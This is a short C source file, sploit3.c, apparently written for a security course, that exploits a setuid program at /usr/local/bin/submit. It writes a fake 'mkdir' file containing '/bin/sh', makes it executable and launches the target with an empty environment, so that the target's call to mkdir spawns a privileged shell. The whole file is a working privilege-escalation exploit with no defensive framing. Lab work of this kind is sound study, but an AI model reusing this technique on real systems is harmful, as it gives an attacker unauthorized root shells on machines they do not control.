/*
 * sploit3.c
 * overwrite mkdir with /bin/sh
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

#define TARGET "/usr/local/bin/submit" // or submitV2

int main() {
    FILE *fp;
	char *args[4];
	char *env[1];
    const char key[] = "/bin/sh";

    fp = fopen("mkdir", "w+");
    fprintf(fp, key);
	fclose(fp);
    chmod("mkdir", 0777);
    

	args[0] = TARGET;
	args[1] = "file.txt"; 
    args[2] = NULL;
    args[3] = NULL;

	env[0] = NULL;

	execve(TARGET, args, env);
    fprintf(stderr, "execve failed\n");
    

	
	return 1;
}
